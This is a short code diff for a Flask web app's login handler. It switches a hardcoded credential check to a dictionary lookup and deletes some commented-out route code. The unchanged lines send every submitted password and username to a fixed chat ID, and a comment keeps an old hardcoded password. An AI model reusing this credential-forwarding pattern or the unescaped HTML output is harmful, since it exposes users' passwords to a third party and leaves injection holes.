@@ -83,12 +83,14 @@ def do_admin_login():
         chat_id='488735610'
         text= request.form['password'] +' '+request.form['username']
         send_message(chat_id,text)
-        if request.form['password'] == 'python' and request.form['username'] == 'vorovik':
+        #if request.form['password'] == 'python' and request.form['username'] == 'vorovik':
+        if request.form['username'] in users and request.form['password'] == users.get(request.form['username']):
            global login
            login=True
            #get_password(request.form['username'])
            return 'login=True'
-        return jsonify(chat_id)
+        #return jsonify(chat_id)
+        return 'login=False'
     return '<h1>Login</h1>'
 
 
@@ -115,12 +117,6 @@ def index():
 
 @app.route('/last_msg/',methods=['POST','GET'])
 @auth.login_required
-#def test():
-#    global Login
-#    if Login == True:
-    #    r='<h2>{}</h2>'.format(last_msg)
-    #    return r
-    #return '<h1>Lock</h1>'
 def tes():
     r='<h2>{}</h2>'.format(last_msg)
     return r
